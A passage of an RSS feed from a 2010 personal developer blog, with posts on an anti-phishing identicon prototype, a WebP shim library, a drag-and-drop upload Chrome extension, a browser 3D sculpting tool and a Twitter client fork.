      <description>&lt;p&gt;&lt;a href=&quot;http://antimatter15.com/misc/identicon/login.php&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Simple%20Anti%20Phishing%20Mechanism/Screenshot-11.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot-11&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I just prototyped the anti phishing system described on &lt;a href=&quot;http://antimatter15.com/2010/11/simple-anti-phishing-mechanism/2010/11/insanely-simple-anti-phishing-system/&quot;&gt;the earlier post&lt;/a&gt;. &lt;a href=&quot;http://hackvertor.co.uk/public&quot;&gt;Gareth Hayes&lt;/a&gt; noted that the the page could have been wrapped in an &amp;lt;iframe&amp;gt; to reuse the identicon. This implementation only shows the identicon if both javascript is present and functional and &lt;tt&gt;top==window&lt;/tt&gt;. Hopefully there aren’t many other huge flaws with it. So it would be awesome if you tried it out.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Getting WebGL/OpenGL 2 to work on a ATI 1950X</title>
      <link>http://antimatter15.com/2010/10/getting-webgl-opengl-2-to-work-on-a-ati-1950x/</link>
      <pubDate>Sat, 30 Oct 2010 21:20:15 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/10/getting-webgl-opengl-2-to-work-on-a-ati-1950x/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;https://launchpad.net/~xorg-edgers/+archive/ppa&quot;&gt;https://launchpad.net/~xorg-edgers/+archive/ppa&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;This post was never finished, but I think that link is helpful enough without a write up. &lt;/p&gt;
</description>
    </item>
    <item>
      <title>Google Suggest + Venn Diagrams</title>
      <link>http://antimatter15.com/2010/10/google-suggest-venn-diagrams/</link>
      <pubDate>Sun, 24 Oct 2010 03:37:54 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/10/google-suggest-venn-diagrams/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;http://antimatter15.github.com/venn-google/venn-google.html&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Google%20Suggest%20+%20Venn%20Diagrams/Screenshot-2.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot-2&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This was a fun little project to create venn diagrams out of google suggest results. &lt;a href=&quot;http://antimatter15.github.com/venn-google/venn-google.html&quot;&gt;Try it out here&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Weppy Updates Opera, Chrome and Firefox support and simpler usage</title>
      <link>http://antimatter15.com/2010/10/weppy-updates-opera-chrome-and-firefox-support-and-simpler-usage/</link>
      <pubDate>Sat, 09 Oct 2010 06:59:34 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/10/weppy-updates-opera-chrome-and-firefox-support-and-simpler-usage/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/Weppy%20Updates%20Opera,%20Chrome%20and%20Firefox%20support%20and%20simpler%20usage/Screenshot-19.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Weppy%20Updates%20Opera,%20Chrome%20and%20Firefox%20support%20and%20simpler%20usage/Screenshot-19.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot-19&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;With help from &lt;a href=&quot;http://twitter.com/Frenzie&quot;&gt;@Frenzie&lt;/a&gt; and &lt;a href=&quot;http://twitter.com/#!/paul_irish/status/26829179917&quot;&gt;@paul_irish&lt;/a&gt;, the latest not-yet-versioned release of Weppy, my Javascript WebP to WebM conversion library, or something of a &lt;a href=&quot;http://remysharp.com/2010/10/08/what-is-a-polyfill/&quot;&gt;polyfill&lt;/a&gt; for a format that is yet to be part of any specification (&lt;a href=&quot;http://dev.w3.org/html5/spec/Overview.html#attr-img-src&quot;&gt;HTML5 seems to specifically reference&lt;/a&gt; the image src attribute are examples such as PNG, GIF, JPEG, APNG, PDF, XML, SVG, SMIL, and MNG). The new release brings some awesome new features that really don’t change much and shouldn’t really be used in the real world because most browsers in the world still aren’t Firefox, Chrome or Opera - that is, a large portion of the browser market includes browsers like Safari and IE, either suffering from antiquity (IE6! aah!) or just liking h264 (IE9 + Safari).&lt;/p&gt;
&lt;p&gt;The new release supports Opera. I never bothered debugging Opera, I figured it was another huge issue that would demand a rewrite (as supporting Firefox had needed, because the order of the object keys isn’t preserved and breaks the EBML result, or at least for Firefox’s parser which seems to be somewhat stricter than Chrome’s, is that ffmpeg?). And after premature optimization (stripping “unnecessary” EBML tags), my code didn’t work in chrome, so I had to revert to an earlier revision. All my testing code was based on file drag-drop stuff, and Opera doesn’t support that. Until I saw this &lt;a href=&quot;http://forums.mozillazine.org/viewtopic.php?p=9991409#p9991409&quot;&gt;mozillazine topic&lt;/a&gt;, I didn’t care, but it was a lot easier to fix than I feared.&lt;/p&gt;
&lt;p&gt;Part of the solution was getting rid of the canvas stage. Admittedly, the canvas stage was pretty useless once the toDataURL() stage was removed before the first public release, but I didn’t feel like deleting code, so it stayed there. Also, I noticed that the global variable that gets introduced was accidentally named “WebM”, which is wrong, it should be “WebP”, but because of the uncreative format naming and similarities, I didn’t notice. Not sure, but it seems to be more stable now.&lt;/p&gt;
&lt;p&gt;Chrome probably will add WebP soon, and it needs to be future proof, detecting whether or not a browser supports the WebP format. To do that, it creates an Image, sets the src to a data url of a 4x4 webp image and listens to the onload and onerror events, checking if the size is correct and there were no errors loading it. The routine is expected to error and totally untested as there aren’t any browsers that support the feature yet for me to try.&lt;/p&gt;
&lt;p&gt;Another change, is that by default, it will automatically load all the same-origin (because of the limitations of XHR) webp images (from &amp;lt;img&amp;gt; tags), on the DOMContentLoaded event, so the library is practically drop-in now. In any web page, you can pretty much add &amp;lt;script src=”&lt;a href=&quot;http://antimatter15.github.com/weppy/weppy.js&quot;&gt;http://antimatter15.github.com/weppy/weppy.js&lt;/a&gt;“&amp;gt;&amp;lt;/script&amp;gt; and on the supported browsers, it should automatically load and replace all WebP images, though not something I would really recommended.&lt;/p&gt;
&lt;p&gt;The demo is the same place it always was: &lt;a href=&quot;http://antimatter15.github.com/weppy/demo.html&quot;&gt;http://antimatter15.github.com/weppy/demo.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;There is also this nifty hack that uses &amp;lt;canvas&amp;gt; to add an alpha channel to the WebP image (adapted from the &lt;a href=&quot;http://blog.jackadam.net/2010/alpha-jpegs/&quot;&gt;original JPEG&lt;/a&gt; one): &lt;a href=&quot;http://antimatter15.github.com/weppy/alpha/alpha.html&quot;&gt;http://antimatter15.github.com/weppy/alpha/alpha.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Also, please follow me&lt;a href=&quot;http://twitter.com/antimatter15&quot;&gt; on twitter&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Weppy Javascript Shim for WebP on Chrome 6 and Firefox 4.0</title>
      <link>http://antimatter15.com/2010/10/weppy-javascript-shim-for-webp-on-chrome-6-and-firefox-4-0/</link>
      <pubDate>Sun, 03 Oct 2010 03:18:02 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/10/weppy-javascript-shim-for-webp-on-chrome-6-and-firefox-4-0/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;http://antimatter15.github.com/weppy/demo.html&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Weppy%20Javascript%20Shim%20for%20WebP%20on%20Chrome%206%20and%20Firefox%204.0/Screenshot-14.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot-14&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;WebP &lt;/strong&gt;&lt;a href=&quot;http://code.google.com/speed/webp/&quot;&gt;http://code.google.com/speed/webp/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Recently, Google announced a new lossy image compression codec, named WebP, intended to supersede JPEG. It is based on VP8’s intraframe compression algorithm. It’s not natively supported in any browsers yet. Weppy is a compatibility layer that changes WebP files into WebM files that can be loaded on several modern browsers.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;How does it work?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;WebP is actually a lightweight container for a single VP8 frame (whereas WebM is a container based off Matroska meant for video). WebM support exists already in Chrome, Firefox and Opera, so all that’s needed to render it is to do a little magic to convert the RIFF encoded WebP image into a EBML/Matroska encoded single frame WebM video, loading it in a , using drawImage() on a  and replacing the .webp image with the data URL extracted from the  using toDataURL().
&lt;strong&gt; Issues&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Chrome (on linux anyway) tends to crash a lot.&lt;/li&gt;
&lt;li&gt;Firefox throws a security exception when doing toDataURL() on a canvas after drawImage() of a video loaded from a data url. The hack being used it to replace the image node with the actual canvas instance.&lt;/li&gt;
&lt;li&gt;Opera doesn’t work. I don’t really have the time to investigate.
&lt;strong&gt; What Browsers?&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Chrome 7.0 and Firefox 4.0 were both tested. Opera doesn’t work for reasons that I’m not sure about. I would appreciate it if someone fixes it and submits a patch :)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Demo&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://antimatter15.github.com/weppy/demo.html&quot;&gt;http://antimatter15.github.com/weppy/demo.html&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>drag2up – Drag files onto any site</title>
      <link>http://antimatter15.com/2010/10/drag2up-drag-files-onto-any-site/</link>
      <pubDate>Fri, 01 Oct 2010 01:44:19 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/10/drag2up-drag-files-onto-any-site/</guid>
      <author></author>
      <description>&lt;object classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; width=&quot;640&quot; height=&quot;505&quot; codebase=&quot;http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0&quot;&gt;&lt;param name=&quot;allowFullScreen&quot; value=&quot;true&quot; /&gt;&lt;param name=&quot;allowscriptaccess&quot; value=&quot;always&quot; /&gt;&lt;param name=&quot;src&quot; value=&quot;http://www.youtube.com/v/TQJppLl_r8w?fs=1&amp;amp;hl=en_US&amp;amp;hd=1&quot; /&gt;&lt;param name=&quot;allowfullscreen&quot; value=&quot;true&quot; /&gt;&lt;embed type=&quot;application/x-shockwave-flash&quot; width=&quot;640&quot; height=&quot;505&quot; src=&quot;http://www.youtube.com/v/TQJppLl_r8w?fs=1&amp;amp;hl=en_US&amp;amp;hd=1&quot; allowscriptaccess=&quot;always&quot; allowfullscreen=&quot;true&quot;&gt;&lt;/embed&gt;&lt;/object&gt;

&lt;p&gt;Drag2Up, is an app named horribly, as I suck at naming things. It’s very simple in terms of capabilities - no buttons, no interface, which is pretty much the ideal type of user experience, something that’s intuitive and lends focus to content, not chrome. Really, this post isn’t useful in any way. What you should do, is &lt;a href=&quot;https://chrome.google.com/extensions/detail/bjgjolhpdlgebodaapdafhdnikagbfll&quot;&gt;install it&lt;/a&gt; and try it out for yourself (Chrome only, It would be possible to make a firefox version, but I have no experience with Firefox extensions, and the new Jetpack isn’t quite out yet, though you can probably adapt the code relatively easily. Maybe a greasemonkey script by using GM_XHR). &lt;a href=&quot;https://chrome.google.com/extensions/detail/bjgjolhpdlgebodaapdafhdnikagbfll&quot;&gt;https://chrome.google.com/extensions/detail/bjgjolhpdlgebodaapdafhdnikagbfll&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Drag and drop is probably one of the greatest forms of interaction ever, it’s intuitive and exemplifies the usefulness of a GUI. Recently, browsers have implemented drag and drop APIs (actually a &lt;a href=&quot;http://www.quirksmode.org/blog/archives/2009/09/the_html5_drag.html&quot;&gt;feature of IE5.5+ &lt;/a&gt;but then codified into part of HTML5). Some browsers, namely Chrome and Firefox implement a dataTransfer property of the drop events that allow one to access files dragged from the user’s desktop (or file browser) onto a web application. The application can read the file through the File API, and do whatever it chooses. Probably most notably is Gmail’s utilization of the feature that allows dragging and dropping files from the desktop onto a message to upload it as an attachment. When it was announced, some people remarked how excited everyone was of a feature that was present in desktop clients for several decades already.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2010/drag2up%20–%20Drag%20files%20onto%20any%20site/128.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/drag2up%20–%20Drag%20files%20onto%20any%20site/128.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;128&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Browser vendors have the role of enabling developers to do cool stuff. It’s up to a web developer or service to maintain an application, to update it and add new features. Undoubtedly, many do, living on the bleeding edge of innovation, but most don’t, and stay locked in a certain state for years if not longer. Extension developers have no obligation to be entirely objective in terms of how it deals with websites, and many are site-specific, adding features to sites that lack them, integrated into the interface, utilizing product-specific APIs, or document structure. Browser vendors enable innovation, site developers integrate standards and browser extensions add features to sites, because the developer is unwilling or because of restrictions on the functionality of web apps (x-domain, persistence, etc).&lt;/p&gt;
&lt;p&gt;Uploading images is a fairly common task, and the standard go-to-file-host-site, click-the-attach-button, browse-button-hitting, navigation-through-folders and waiting-for-page-to-reload-after-uploading, link-copying, tab-switching and pasting. Some applications like &lt;a href=&quot;http://www.getcloudapp.com/&quot;&gt;CloudApp&lt;/a&gt; look promising in alleviating this needlessly tedious process, but only reduce the interaction steps a little. The ideal would be making that third-party file upload service integrate seamlessly into all web applications, with a level of integration akin to Gmail, drag and drop.&lt;/p&gt;
&lt;p&gt;As awesome as it sounds, it’s not as easy to implement as one might like. The basic idea was to detect when a drag event started, and to iterate all the elements, adding an absolutely positioned, semitransparent mask to indicate that it’s a drop target. A few issues occur with that, I have &lt;a href=&quot;http://antimatter15.com/2010/10/drag2up-drag-files-onto-any-site/2010/10/gmail-style-html5-dragdrop/&quot;&gt;a little writeup on those issues&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;A lot of WYSIWYG editors use iframes, and creating content scripts with all_frames: true doesn’t necessarily mean it runs on all frames (for some very odd reason). And also for some reason, there’s no way to access frames from window.frames in content scripts. So I have this hack where if there are frames, it injects some javascript into the real page executed in the page’s context to run it within the iframe (if it’s the same domain, as it always is in wysiwyg editors). Then events get propagated from the sub-frame into the parent window, through postMessage that is subsequently handled by the content script, forwarded to a background page using chrome.extensions.sendRequest, and it all happens in reverse once the server gives a response. As such, it’s a really bad idea to use this for large files since it needs to be passed around several times over several pages, and apparently &lt;a href=&quot;http://blog.andrewvc.com/node-js-and-binary-data&quot;&gt;V8 isn’t the best with big strings&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Aside from that, uploading to imgur for some odd reason takes a long time. I don’t like sites that don’t have simple JSON POST APIs, and there really aren’t many that fit that criterion. So with the initial release, images are uploaded with imgur and text files are all uploaded to a github gist.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Gmail Style HTML5 Drag/Drop</title>
      <link>http://antimatter15.com/2010/10/gmail-style-html5-drag-drop/</link>
      <pubDate>Fri, 01 Oct 2010 01:33:38 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/10/gmail-style-html5-drag-drop/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/Gmail%20Style%20HTML5%20DragDrop/Screenshot-8.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Gmail%20Style%20HTML5%20DragDrop/Screenshot-8-300x200.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;DragDropAwesome&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I’m making a (really awesome) chrome extension that involves dragging and dropping files. MDC, as &lt;a href=&quot;http://promotejs.com/&quot;&gt;usual&lt;/a&gt;, has great &lt;a href=&quot;https://developer.mozilla.org/En/DragDrop/DataTransfer&quot;&gt;information&lt;/a&gt; on the &lt;a href=&quot;https://developer.mozilla.org/en/using_files_from_web_applications&quot;&gt;topic&lt;/a&gt;. Gmail does it almost perfectly, with the green file drop target. But all other implementations of this feature suffer from two issues, and Gmail’s code is far too obfuscated for any mere mortal to interpret (no doubt thanks to closure). When implementing the file drop target, two fairly important user experience issues occur. I don’t know what way Gmail does it, and I just used whatever solution worked.&lt;/p&gt;
&lt;p&gt;Firstly, is that you only want to trigger the drop target once a file is being dragged onto the web app. You don’t want a file drop target to appear once someone starts dragging text (fairly simple, check that e.dataTransfer.types includes File). Even trickier (even Gmail doesn’t get this right) is dragging links also triggers the file drop target for some reason (it’s tricky because then e.dataTransfer.types also includes the File type for some odd reason). There’s no way to access file data as it’s being dragged (getData always returns undefined). One thing that I still have no idea about is inter-browser-window data transfers.&lt;/p&gt;
&lt;script src=&quot;http://gist.github.com/606882.js&quot;&gt; &lt;/script&gt;

&lt;p&gt;Secondly, is how to get the dialog to dismiss itself once the dragged image is dragged out of the viewport. It’s pretty tricky because of how the events bubble and don’t always go through &amp;lt;body&amp;gt;. The solution I eventually arrived at was to add a timer on the dragleave and see if within fifty milliseconds (a random amount of time, zero works too, but fifty feels safer), another drag event is fired.&lt;/p&gt;
&lt;script src=&quot;http://gist.github.com/606885.js&quot;&gt; &lt;/script&gt;

&lt;p&gt;Hopefully, people will find this useful :)&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Readability iframe Extension</title>
      <link>http://antimatter15.com/2010/09/readability-iframe-extension/</link>
      <pubDate>Sun, 19 Sep 2010 05:40:43 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/09/readability-iframe-extension/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/Readability%20iframe%20Extension/4999063919_c257720416_o.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Readability%20iframe%20Extension/4999063919_c257720416_o-300x251.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Inspiration&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I was inspired by &lt;a href=&quot;http://twitter.com/chrismessina/status/24791169387&quot;&gt;chris messina&lt;/a&gt;‘s idea of integrating Readability into a twitter client. Sadly, I don’t have newtwitter yet, so I can’t actually do that. But since I do have the ultrahackable Streamie client, I’ve updated&lt;a href=&quot;http://antimatter15.streamie.org&quot;&gt; my fork of streamie&lt;/a&gt; with that functionality. It relies on &lt;a href=&quot;https://chrome.google.com/extensions/detail/nahmdndkmncjhppbaomnecihdmijgmne&quot;&gt;a chrome extension&lt;/a&gt; that sort of makes an exception to the cross domain policy that makes all frames with a URL that includes #readStyle automatically load the readability bookmarklet.&lt;/p&gt;
&lt;p&gt;Inspired by this&lt;/p&gt;
</description>
    </item>
    <item>
      <title>3D Sculpting Tool</title>
      <link>http://antimatter15.com/2010/09/3d-sculpting-tool/</link>
      <pubDate>Wed, 08 Sep 2010 02:24:41 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/09/3d-sculpting-tool/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/3D%20Sculpting%20Tool/Death-Star-2.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/3D%20Sculpting%20Tool/Death-Star-2.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Death Star 2&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2010/3D%20Sculpting%20Tool/Alderaan.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/3D%20Sculpting%20Tool/Alderaan.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Alderaan&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;So for the  past few days, I discovered this neat app called &lt;a href=&quot;http://www.sculptris.com/&quot;&gt;Sculptris&lt;/a&gt;. It’s this amazing &lt;a href=&quot;http://en.wikipedia.org/wiki/Digital_sculpting&quot;&gt;digital sculpting&lt;/a&gt; app where your canvas is basically a blob of virtual clay that can be molded into any shape with any level of detail. It’s windows-only, and I thought it would be neat to have something like it that works in the browser. First I thought of using WebGL, but trying to start chromium with webgl always ends up with a GLXFBConfig error, and on Firefox, it’s stuck with using libosmesa which gives absolutely terrible framerates (IDK why but Fx4 &lt;em&gt;crawls&lt;/em&gt; on my computer. Panorama is so slow it lags from simple dragging). Eventually, I ended up basing it off my js1k function plotter, because it’s a fairly simple 3d renderer.&lt;/p&gt;
&lt;p&gt;The pictures on the top of the page are of &lt;a href=&quot;http://en.wikipedia.org/wiki/Death_Star&quot;&gt;the death star&lt;/a&gt; and &lt;a href=&quot;http://en.wikipedia.org/wiki/Alderaan&quot;&gt;alderaan&lt;/a&gt;, respectively, mostly because planets (and moons that aren’t moons) are mostly spherical and explosions and light rays are pretty much the only things that this app is suitable for at these stages.&lt;/p&gt;
&lt;p&gt;So how does it work? It’s actually really simple, and probably too simple. At ~300 LOC  of pretty trivial JS, it’s not much at all (though it is hideous, I must warn you). It is based on my js1k entry, and I considered making this a 1k submission, but I gave up and said I couldn’t. It starts off simple enough, do lots of freaky trigonometric loops to generate a set of points that lie on a sphere. Then loop through every 50 milliseconds, apply a 3d transformation, get points that lie within a radius of the mouse position and reference them in the selected array. Then you segregate the selected array into the foreground and background, find the arithmetic mean of the fg and bg, respectively and find the difference. Then I convert it to spherical coordinates and get rid of the ratio to ignore the magnitude of the vector and add it to the position of foreground points. Then loop through all the points and wherever there’s a long distance, insert a new dot at the midpoint.&lt;/p&gt;
&lt;p&gt;For no apparent reason I decided not to put many words on it. I was actually reluctant to add “points” and “undo”, but it’s fine print in faded color that doesn’t help the user at all.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Middle Click + Drag to rotate (in 3d)&lt;/li&gt;
&lt;li&gt;Right Drag to deflate the shape&lt;/li&gt;
&lt;li&gt;Left Drag to inflate the shape&lt;/li&gt;
&lt;li&gt;Middle Scroll to zoom in/out&lt;/li&gt;
&lt;li&gt;The slider bar is for controlling the size of the selection.&lt;/li&gt;
&lt;li&gt;The checkbox enables/disables Undo/Redo (via CtrlZ/CtrlY or CtrlZ/Ctrl+Shift+Z).
App: &lt;a href=&quot;http://antimatter15.github.com/3d-sculpt/3d.html&quot;&gt;http://antimatter15.github.com/3d-sculpt/3d.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Mirrored Version: &lt;a href=&quot;http://antimatter15.github.com/3d-sculpt/mirror.html&quot;&gt;http://antimatter15.github.com/3d-sculpt/mirror.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;(Not as in the other meaning for mirror, but it actually reflects the X axis so that it’s symmetrical, which is a neat feature in sculptris)&lt;/p&gt;
&lt;p&gt;Github: &lt;a href=&quot;http://github.com/antimatter15/3d-sculpt&quot;&gt;http://github.com/antimatter15/3d-sculpt&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Why my Streamie fork is better than everyone else’s</title>
      <link>http://antimatter15.com/2010/09/why-my-streamie-fork-is-better-than-everyone-else-s/</link>
      <pubDate>Wed, 01 Sep 2010 02:44:53 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/09/why-my-streamie-fork-is-better-than-everyone-else-s/</guid>
      <author></author>
      <description>&lt;p&gt;So the &lt;a href=&quot;http://www.nonblocking.io/2010/08/future-is-here-i-just-forked-running.html&quot;&gt;future is here and everyone is forking running websites&lt;/a&gt;. The rate of development is pretty insane and I’ve already disabled &lt;a href=&quot;https://chrome.google.com/extensions/detail/encaiiljifbdbjlphpgpiimidegddhic&quot;&gt;Chromed Bird&lt;/a&gt; and I’m switching to having Streamie as a pinned tab, which also leads inevitably to the question &lt;a href=&quot;http://antimatter15.com/wp/2009/08/how-i-would-design-the-browser-2-addons/&quot;&gt;“Why is a pinned application tab aesthetically different from a Browser Action?”&lt;/a&gt; . But back to the point, this post will detail every little feature that is utterly insignificant in the grand scheme of things that I felt like improving on in the streamie client.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2010/Why%20my%20Streamie%20fork%20is%20better%20than%20everyone%20else’s/Screenshot-6.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Why%20my%20Streamie%20fork%20is%20better%20than%20everyone%20else’s/Screenshot-6.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot-6&lt;/div&gt;&lt;/div&gt;&lt;/a&gt; Retweeters show a little icon&lt;/p&gt;
&lt;p&gt;This is a feature that was in Chromed Bird and Tweetie and was pretty easy so why not implement it.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2010/Why%20my%20Streamie%20fork%20is%20better%20than%20everyone%20else’s/Screenshot-9.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Why%20my%20Streamie%20fork%20is%20better%20than%20everyone%20else’s/Screenshot-9.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot-9&lt;/div&gt;&lt;/div&gt;&lt;/a&gt; Short links are automatically expanded&lt;/p&gt;
&lt;p&gt;This feature is accomplished using Dion Almaer’s &lt;a href=&quot;http://code.google.com/p/endpoint-resolver/&quot;&gt;endpoint resolver&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2010/Why%20my%20Streamie%20fork%20is%20better%20than%20everyone%20else’s/Screenshot-8.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Why%20my%20Streamie%20fork%20is%20better%20than%20everyone%20else’s/Screenshot-8.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot-8&lt;/div&gt;&lt;/div&gt;&lt;/a&gt; Better link detection&lt;/p&gt;
&lt;p&gt;My fork uses John Gruber’s &lt;a href=&quot;http://daringfireball.net/2010/07/improved_regex_for_matching_urls&quot;&gt;improved liberal, accurate Regex pattern for matching URLs&lt;/a&gt;. This allows cases like the above to be properly ended at the parenthesis while still allowing wikipedia links that include parentheses.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2010/Why%20my%20Streamie%20fork%20is%20better%20than%20everyone%20else’s/Screenshot-7.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Why%20my%20Streamie%20fork%20is%20better%20than%20everyone%20else’s/Screenshot-7.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot-7&lt;/div&gt;&lt;/div&gt;&lt;/a&gt; What client was used to post it.&lt;/p&gt;
&lt;p&gt;Mine displays what client the poster is using.&lt;/p&gt;
&lt;p&gt;You can try it out on &lt;a href=&quot;http://antimatter15.streamie.org/&quot;&gt;http://antimatter15.streamie.org/&lt;/a&gt; But seriously, all the forking of streamie is probably great for the project, and my role is very insignificant, and it would be great if some of the features got into the master branch :)&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Sort-of working Linux-friendly Apple Event Playlist</title>
      <link>http://antimatter15.com/2010/08/sort-of-working-linux-friendly-apple-event-playlist/</link>
      <pubDate>Tue, 31  Aug 2010 21:31:13 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/08/sort-of-working-linux-friendly-apple-event-playlist/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;http://antimatter15.com/misc/playlist.xspf&quot;&gt;http://antimatter15.com/misc/playlist.xspf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2010/Sort-of%20working%20Linux-friendly%20Apple%20Event%20Playlist/sjobslinux.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Sort-of%20working%20Linux-friendly%20Apple%20Event%20Playlist/sjobslinux.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;sjobslinux&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>HTTP based federated protocol for real time hierarchical message manipulation</title>
      <link>http://antimatter15.com/2010/08/http-based-federated-protocol-for-real-time-hierarchical-message-manipulation/</link>
      <pubDate>Sat, 28  Aug 2010 21:53:04 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/08/http-based-federated-protocol-for-real-time-hierarchical-message-manipulation/</guid>
      <author></author>
